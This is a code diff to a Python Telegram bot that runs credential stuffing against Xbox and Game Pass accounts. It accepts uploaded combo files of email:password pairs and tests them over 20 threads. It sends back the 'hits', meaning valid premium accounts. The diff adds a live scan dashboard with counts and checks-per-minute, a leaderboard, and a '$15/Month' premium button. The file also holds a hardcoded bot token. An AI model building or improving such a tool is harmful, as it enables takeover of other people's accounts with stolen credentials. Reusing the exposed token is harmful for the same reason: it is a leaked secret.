@@ -10,6 +10,7 @@ from urllib.parse import quote, unquote
 from threading import Lock
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ─── Bot Configuration ───────────────────────────────────────────
 TOKEN = "8896382526:AAEySaJWfg6pQpoRuSu8zQaG50uJ_Jf0obg"
@@ -211,7 +212,33 @@ class XboxChecker:
 # ─── Telegram Bot Handlers ───────────────────────────────────────
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, f"⚡ **{BOT_NAME} Checker Bot**\nWelcome! Send your Combo file (.txt) to start checking accounts.")
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("🎮 Start GamePass Filter Bot", callback_data="start_scan_menu"))
+    markup.add(InlineKeyboardButton("🏆 Leaderboard", callback_data="leaderboard"))
+    markup.add(InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium"))
+    markup.add(InlineKeyboardButton("👤 My Account", callback_data="my_account"))
+
+    welcome_text = (
+        f"⚡ **{BOT_NAME} GamePass Filter & Checker - V6.2** ⚡\n\n"
+        f"Specialized in filtering accounts and detecting Game Pass status!\n"
+        f"Your Status: 👑 Premium / Owner (Unlimited)"
+    )
+    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data in ["start_scan_menu", "leaderboard", "buy_premium", "my_account"])
+def handle_menu_callbacks(call):
+    if call.data == "start_scan_menu":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, f"📥 **{BOT_NAME}**\nPlease send your Combo file (`.txt` formatted as `email:password`) to start the live scan.")
+    elif call.data == "leaderboard":
+        bot.answer_callback_query(call.id, "Owner r1ivk is #1 on the leaderboard!")
+        bot.send_message(call.message.chat.id, f"🏆 **Leaderboard**\n1. Owner `{BOT_NAME}` - Unlimited Hits")
+    elif call.data == "buy_premium":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, f"💎 You are the Owner (`{BOT_NAME}`), you have lifetime unlimited access!")
+    elif call.data == "my_account":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, f"👤 **Account Info**\nUsername: `{BOT_NAME}`\nStatus: Owner 👑")
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -222,8 +249,6 @@ def handle_docs(message):
         combo_path = f"temp_{message.chat.id}.txt"
         with open(combo_path, 'wb') as f:
             f.write(downloaded_file)
-
-        bot.reply_to(message, f"📥 **File received. Starting check via {BOT_NAME} Checker...**")
 
         combos = []
         with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
@@ -240,6 +265,7 @@ def handle_docs(message):
             bot.reply_to(message, "❌ The file is empty or improperly formatted (must be email:password).")
             return
 
+        total_combos = len(combos)
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         hit_filename = f"{BOT_NAME}_GamePassHits_{timestamp}.txt"
         
@@ -247,12 +273,38 @@ def handle_docs(message):
         total_hits = 0
         twofa_count = 0
         bad_count = 0
+        error_count = 0
         
+        start_time = time.time()
         checker = XboxChecker()
         lock = Lock()
 
+        # إرسال رسالة الواجهة الحية الأولى
+        live_markup = InlineKeyboardMarkup()
+        live_markup.add(
+            InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan"),
+            InlineKeyboardButton("🔄 Refresh", callback_data="refresh_scan")
+        )
+
+        current_time_str = datetime.now().strftime("%H:%M:%S")
+        initial_msg = (
+            f"🔥 **LIVE SCAN STATS (Auto-refresh | {current_time_str})**\n\n"
+            f"📊 Total: `{total_combos}`\n"
+            f"✅ Checked: `0`\n"
+            f"❌ Bad: `0`\n"
+            f"🎯 Hits: `0`\n"
+            f"📱 2FA: `0`\n"
+            f"⚠️ Errors: `0`\n\n"
+            f"Progress: `0.0%`\n"
+            f"⚡ CPM: `0`\n"
+            f"⏱️ Elapsed: `00:00:00`\n"
+            f"👑 Owner: `{BOT_NAME}`"
+        )
+        
+        status_msg = bot.send_message(message.chat.id, initial_msg, reply_markup=live_markup, parse_mode="Markdown")
+
         def worker(email, pwd):
-            nonlocal checked, total_hits, twofa_count, bad_count
+            nonlocal checked, total_hits, twofa_count, bad_count, error_count
             res = checker.check(email, pwd)
             status = res.get("status")
             
@@ -265,29 +317,63 @@ def handle_docs(message):
                         hf.write(f"{email}:{pwd} | Type: {data.get('premium_type')} | Days: {data.get('days_remaining')}\n")
                 elif status == "2FA":
                     twofa_count += 1
+                elif status == "ERROR":
+                    error_count += 1
                 else:
                     bad_count += 1
 
+        # تشغيل الفحص في الخلفية وتحديث الواجهة الحية كل ثانيتين
         with ThreadPoolExecutor(max_workers=20) as executor:
             futures = [executor.submit(worker, email, pwd) for email, pwd in combos]
-            for future in as_completed(futures):
-                pass
+            
+            while True:
+                done_checking = sum(1 for f in futures if f.done())
+                elapsed = int(time.time() - start_time)
+                elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
+                cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
+                progress = (checked / total_combos) * 100 if total_combos > 0 else 0
+                
+                upd_time = datetime.now().strftime("%H:%M:%S")
+                updated_text = (
+                    f"🔥 **LIVE SCAN STATS (Auto-refresh | {upd_time})**\n\n"
+                    f"📊 Total: `{total_combos}`\n"
+                    f"✅ Checked: `{checked}`\n"
+                    f"❌ Bad: `{bad_count}`\n"
+                    f"🎯 Hits: `{total_hits}`\n"
+                    f"📱 2FA: `{twofa_count}`\n"
+                    f"⚠️ Errors: `{error_count}`\n\n"
+                    f"Progress: `{progress:.1f}%`\n"
+                    f"⚡ CPM: `{cpm}`\n"
+                    f"⏱️ Elapsed: `{elapsed_str}`\n"
+                    f"👑 Owner: `{BOT_NAME}`"
+                )
+                
+                try:
+                    bot.edit_message_text(updated_text, chat_message_id=status_msg.message_id, chat_id=message.chat.id, reply_markup=live_markup, parse_mode="Markdown")
+                except:
+                    pass
 
-        summary_text = (
-            f"⚡ **{BOT_NAME} Checker — SCAN COMPLETED!**\n\n"
-            f"📊 Total Checked: {checked}\n"
-            f"🎯 Total Hits (Premium): {total_hits}\n"
-            f"🔒 2FA Protected: {twofa_count}\n"
-            f"❌ Bad Accounts: {bad_count}"
+                if done_checking == total_combos:
+                    break
+                time.sleep(2)
+
+        # رسالة اكتمال الفحص النهائية
+        final_summary = (
+            f"⚡ **{BOT_NAME} Checker — SCAN COMPLETED!** ⚡\n\n"
+            f"📊 Total Checked: `{checked}`\n"
+            f"🎯 Total Hits (Premium): `{total_hits}`\n"
+            f"🔒 2FA Protected: `{twofa_count}`\n"
+            f"❌ Bad Accounts: `{bad_count}`\n"
+            f"👑 Owner: `{BOT_NAME}`"
         )
-        bot.send_message(message.chat.id, summary_text, parse_mode="Markdown")
+        bot.send_message(message.chat.id, final_summary, parse_mode="Markdown")
 
         if total_hits > 0 and os.path.exists(hit_filename):
             with open(hit_filename, 'rb') as hf:
                 bot.send_document(
                     message.chat.id, 
                     hf, 
-                    caption=f"📁 **Hits Results File:**\n`{hit_filename}`", 
+                    caption=f"📁 **Hits Results File:**\n`{hit_filename}`\n👑 Owner: `{BOT_NAME}`", 
                     parse_mode="Markdown"
                 )
             os.remove(hit_filename)
@@ -298,5 +384,5 @@ def handle_docs(message):
         bot.reply_to(message, f"❌ An error occurred: {str(e)}")
 
 if __name__ == "__main__":
-    print(f"[*] Bot {BOT_NAME} Checker is running...")
+    print(f"[*] Bot {BOT_NAME} Checker is running with Live Stats...")
     bot.infinity_polling()
